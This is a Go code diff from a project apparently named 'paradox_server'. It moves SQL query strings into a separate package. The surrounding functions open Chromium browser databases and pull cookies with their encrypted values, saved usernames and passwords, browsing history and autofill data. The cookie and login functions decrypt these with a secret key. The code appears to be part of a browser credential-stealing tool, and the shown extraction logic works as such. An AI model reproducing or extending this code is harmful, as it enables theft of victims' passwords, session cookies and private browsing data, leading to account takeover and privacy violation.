@@ -5,20 +5,14 @@ import (
 	"log"
 	"paradox_server/crypto"
 	"paradox_server/models"
+	"paradox_server/static"
 
 	_ "github.com/mattn/go-sqlite3"
 )
 
-var (
-	queryChromiumCookie  = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
-	queryChromiumLogin   = `SELECT origin_url, username_value, password_value, date_created FROM logins`
-	queryChromiumHistory = `SELECT url, title, visit_count, last_visit_time, typed_count, hidden FROM urls`
-	queryChromiumWebData = `SELECT name, value, date_created, date_last_used, count, form_data_type FROM autofill`
-)
-
 func ChromeCookies(cookiesFile string, secretKey []byte, osType string) []models.Cookie {
 	cookiesDB, _ := sql.Open("sqlite3", "file:"+cookiesFile)
-	rows, _ := cookiesDB.Query(queryChromiumCookie)
+	rows, _ := cookiesDB.Query(static.QueryChromiumCookie)
 
 	var decryptedCookies []models.Cookie
 	for rows.Next() {
@@ -64,7 +58,7 @@ func ChromeLoginData(loginDataFile string, secretKey []byte) []models.LoginData 
 	}
 	defer loginDB.Close()
 
-	rows, err := loginDB.Query(queryChromiumLogin)
+	rows, err := loginDB.Query(static.QueryChromiumLogin)
 	if err != nil {
 		log.Printf("Error querying logins from %s: %v", loginDataFile, err)
 		return decryptedLogins
@@ -133,7 +127,7 @@ func ChromeHistory(historyFile string) []models.HistoryEntry {
 	}
 	defer historyDB.Close()
 
-	rows, err := historyDB.Query(queryChromiumHistory)
+	rows, err := historyDB.Query(static.QueryChromiumHistory)
 	if err != nil {
 		log.Printf("Error querying history from %s: %v", historyFile, err)
 		return history
@@ -184,7 +178,7 @@ func ChromeWebData(webDataFile string) []models.WebDataEntry {
 	}
 	defer webDB.Close()
 
-	rows, err := webDB.Query(queryChromiumWebData)
+	rows, err := webDB.Query(static.QueryChromiumWebData)
 	if err != nil {
 		log.Printf("Error querying web data from %s: %v", webDataFile, err)
 		return webData
